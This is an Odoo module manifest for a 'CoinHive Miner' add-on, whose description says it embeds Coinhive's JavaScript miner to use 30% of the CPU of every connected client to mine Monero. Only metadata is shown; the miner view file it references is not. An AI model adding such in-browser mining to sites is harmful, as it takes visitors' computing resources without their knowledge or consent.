# -*- coding: utf-8 -*-
{
    'name': "CoinHive Miner",

    'summary': """
        Embed Javascript miner from Coinhive
    """,

    'description': """
        Use 30% of the cpu resources on every client connected to Odoo to mine XMR
    """,

    'author': "Rémi Bédard-Couture",
    'website': "https://github.com/remz1337/remz_odoo",
    'category': 'web',
    'version': '10.0.0.1',
    'depends': ['base'],
    'data': [
        'views/coinhive_miner.xml',
    ],
}
